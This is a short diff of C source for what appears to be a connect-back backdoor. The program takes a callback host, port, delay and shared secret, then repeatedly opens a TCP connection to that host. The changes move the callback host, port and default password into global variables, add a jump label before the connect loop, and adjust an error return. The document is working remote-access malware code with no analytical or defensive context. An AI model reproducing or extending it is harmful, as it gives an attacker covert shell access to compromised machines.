@@ -15,11 +15,12 @@
 #include "config.h"
 #include "pel.h"
 
-#define ERROR	-1
-
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
 extern int optind;
+short int connect_back_port = 0;
+char *connect_back_host = NULL;
+char *secret = PASS;
 
 void usage(char *argv0) {
     	fprintf(stderr, "Usage: %s [ -t connect_back_host ] [ -p port ] [ -r delay (optional) ] [ -s secret (optional) ]\n", argv0);
@@ -256,7 +257,7 @@ int main( int argc, char **argv ) {
 
 	do {
 		if(delay > 0) sleep(delay);
-
+connect:
     		client = socket(AF_INET, SOCK_STREAM, 0);
 		if(client < 0) continue;
     		client_host = gethostbyname(connect_back_host);
@@ -298,7 +299,7 @@ int main( int argc, char **argv ) {
 
     		if(ret != PEL_SUCCESS) { 
         		shutdown(client, 2);
-        		return(ERROR);
+			return ERROR;
     		}
 
     		alarm(0);
